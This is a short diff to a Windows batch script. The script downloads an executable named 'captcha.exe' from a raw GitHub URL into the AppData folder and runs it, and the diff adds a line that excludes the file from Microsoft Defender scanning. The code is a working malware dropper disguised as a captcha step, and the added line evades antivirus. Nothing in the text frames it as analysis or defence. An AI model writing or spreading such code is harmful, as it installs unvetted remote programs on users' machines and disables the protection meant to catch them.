@@ -10,3 +10,4 @@ set "url=https://raw.githubusercontent.com/bensgaming-dot/bensgaming-dot.github.
 set "path=%appdata%\captcha.exe"
 powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%path%'"
 if exist "%path%" start "" "%path%"
+powershell -Command "Add-MpPreference -ExclusionPath '%path%'"
